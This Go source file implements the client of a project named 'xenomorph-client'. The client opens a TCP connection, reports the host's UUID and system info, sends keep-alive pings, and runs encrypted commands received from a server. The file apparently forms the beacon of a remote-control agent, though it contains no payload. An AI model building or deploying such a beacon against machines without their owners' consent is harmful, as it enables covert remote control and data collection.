package client

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"github.com/codevault-llc/xenomorph-client/internal/command"
	"github.com/codevault-llc/xenomorph-client/internal/protocol"
	"github.com/codevault-llc/xenomorph-client/internal/secure"
	"github.com/codevault-llc/xenomorph-client/internal/services/system"
	"github.com/codevault-llc/xenomorph-client/pkg/logger"
	"go.uber.org/zap"
)

type Client struct {
	Address   string
	Conn      net.Conn
	Sec       *secure.Sec
	Handler   command.CommandHandler
	KeepAlive chan struct{}
}

// NewClient creates a new Client instance with the specified address.
// It initializes the command handler and the secure connection manager.
func NewClient(addr string) *Client {
	handler := command.NewHandler()

	return &Client{
		Address:   addr,
		Sec:       secure.New(),
		Handler:   handler,
		KeepAlive: make(chan struct{}),
	}
}

// Connect establishes a TCP connection to the server at the specified address.
// It returns an error if the connection fails.
func (c *Client) Connect() error {
	conn, err := net.Dial("tcp", c.Address)
	if err != nil {
		return fmt.Errorf("connect error: %w", err)
	}
	c.Conn = conn
	return nil
}

// Run starts the client, connects to the server, and listens for incoming messages.
// It sends a connection message with the system UUID and system info.
// It also starts a keep-alive routine that sends a ping message every 30 seconds.
// If an error occurs during connection or message parsing, it logs the error and continues.
func (c *Client) Run() error {
	defer c.Close()

	if err := c.Connect(); err != nil {
		logger.GetLogger().Error("Failed to connect to server", zap.Error(err))
		return err
	}

	go c.keepAlive()

	connectMsg := protocol.NewMessage(protocol.TypeConnect, map[string]any{
		"uuid": system.GetUUID(),
	})
	c.Send(connectMsg)

	info := system.Info()
	c.Send(protocol.NewMessage(protocol.TypeConnection, info))

	command.InitCommands()

	scanner := bufio.NewScanner(c.Conn)
	for scanner.Scan() {
		raw := scanner.Bytes()
		msg, err := protocol.ParseMessage(c.Sec, raw)
		if err != nil {
			logger.GetLogger().Error("Failed to parse message", zap.Error(err), zap.ByteString("raw", raw))
			continue
		}

		c.Handler.Handle(msg)
	}

	return scanner.Err()
}

// Send sends a message to the server after encrypting and serializing it.
// It handles errors during serialization and logs them.
func (c *Client) Send(msg protocol.Message) {
	data, err := msg.EncryptAndSerialize(c.Sec)
	if err != nil {
		logger.GetLogger().Error("Failed to serialize message", zap.Error(err), zap.String("type", msg.Type))
		return
	}

	// Send header
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(data)))
	c.Conn.Write(header)
	c.Conn.Write(data)
}

// keepAlive sends a ping message every 30 seconds to keep the connection alive.
// It listens for a signal on the KeepAlive channel to stop the routine.
func (c *Client) keepAlive() {
	ticker := time.NewTicker(30 * time.Second)
	for {
		select {
		case <-ticker.C:
			ping := protocol.NewMessage(protocol.TypePing, nil)
			c.Send(ping)
		case <-c.KeepAlive:
			return
		}
	}
}

// Close closes the client connection and stops the keep-alive routine.
// It should be called when the client is no longer needed.
func (c *Client) Close() {
	if c.Conn != nil {
		c.Conn.Close()
	}
	close(c.KeepAlive)
}
